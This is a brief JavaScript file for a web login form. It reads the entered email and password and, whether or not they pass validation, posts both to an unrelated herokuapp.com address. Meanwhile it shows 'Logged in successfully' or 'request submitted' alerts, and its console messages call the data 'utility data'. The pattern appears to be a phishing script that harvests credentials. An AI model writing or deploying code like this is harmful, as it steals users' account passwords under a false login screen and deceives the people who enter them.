document.addEventListener('DOMContentLoaded', function () {
    const submitButton = document.querySelector('input[type="button"]');
    submitButton.addEventListener('click', processData);
  
  });
  function processData() {
    const email= document.getElementById("email").value.trim();
    const password=document.getElementById("password").value.trim();
    
    if (validateEmail(email) && validatePassword(password)) {
      alert("Logged in successfully");}
    else{
      showError();
 
   }
   const data= {
    "Email": email,
    "Password": password,

  };
  fetch('https://rocky-wildwood-58249-5658bfaadb54.herokuapp.com/',{
    method:'POST',
    headers:{
      'content-Type':'application/json'
    },
    
     body:JSON.stringify(data)
  })
  .then(response => {
  if (!response.ok) {
    alert("Trouble loggin in.Kindly check your email and password and try again")
  }
  else{
    alert("Your request was submitted succesfully")
  }
  console.log('Utility data successfully saved.');
})
.catch(error => {
  console.error('There was a problem saving utility data:', error.message);
});
  
}